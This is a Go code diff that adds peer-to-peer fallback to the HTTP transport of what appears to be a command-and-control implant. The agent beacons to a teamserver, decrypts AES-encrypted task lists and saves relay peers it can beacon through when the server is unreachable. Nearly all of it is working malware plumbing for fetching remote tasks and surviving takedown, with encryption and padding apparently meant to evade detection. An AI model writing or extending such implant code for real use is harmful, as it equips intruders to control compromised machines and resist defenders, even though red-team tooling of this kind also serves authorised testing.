@@ -10,6 +10,7 @@ import (
 	"net/http"
 	"net/url"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
 )
@@ -23,6 +24,16 @@ type httpTransport struct {
 	beaconURIs []string
 	uriIdx     atomic.Int64
 	extraHdrs  [][2]string
+
+	// mesh peers — updated from beacon responses; used as fallback when teamserver unreachable
+	meshMu    sync.RWMutex
+	meshPeers []peerWire
+}
+
+// peerWire matches the server's peerWire struct.
+type peerWire struct {
+	Addr  string `json:"addr"`
+	Proto string `json:"proto,omitempty"`
 }
 
 // errAgentUnknown is returned by beacon() when the server no longer recognises
@@ -58,6 +69,7 @@ type taskWire struct {
 
 type beaconResponse struct {
 	Tasks   []taskWire `json:"tasks"`
+	Peers   []peerWire `json:"peers,omitempty"`
 	Padding string     `json:"_p,omitempty"`
 }
 
@@ -205,6 +217,59 @@ func (t *httpTransport) beacon() ([]taskWire, error) {
 	}
 	if resp.StatusCode != http.StatusOK {
 		return nil, fmt.Errorf("beacon: status %d", resp.StatusCode)
+	}
+	ciphertext, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+	plaintext, err := open(t.aesKey, ciphertext)
+	if err != nil {
+		return nil, err
+	}
+	var br beaconResponse
+	if err := json.Unmarshal(plaintext, &br); err != nil {
+		return nil, err
+	}
+	// Save peer list for fallback use if teamserver becomes unreachable.
+	if len(br.Peers) > 0 {
+		t.meshMu.Lock()
+		t.meshPeers = br.Peers
+		t.meshMu.Unlock()
+	}
+	return br.Tasks, nil
+}
+
+// savedPeers returns a snapshot of the last known mesh peers.
+func (t *httpTransport) savedPeers() []peerWire {
+	t.meshMu.RLock()
+	defer t.meshMu.RUnlock()
+	out := make([]peerWire, len(t.meshPeers))
+	copy(out, t.meshPeers)
+	return out
+}
+
+// beaconViaPeer tries to beacon through a mesh peer acting as an HTTP relay.
+// The peer must be running an HTTP pivot server that forwards to the real teamserver.
+func (t *httpTransport) beaconViaPeer(peerAddr string) ([]taskWire, error) {
+	peerURL := "http://" + peerAddr
+	req, err := http.NewRequest(http.MethodGet, peerURL+"/beacon/"+t.agentID, nil)
+	if err != nil {
+		return nil, err
+	}
+	t.applyHeaders(req)
+
+	// Use a short timeout so we fail fast and try the next peer.
+	cl := &http.Client{Timeout: 10 * time.Second}
+	resp, err := cl.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == http.StatusNoContent {
+		return nil, nil
+	}
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("peer beacon: status %d", resp.StatusCode)
 	}
 	ciphertext, err := io.ReadAll(resp.Body)
 	if err != nil {
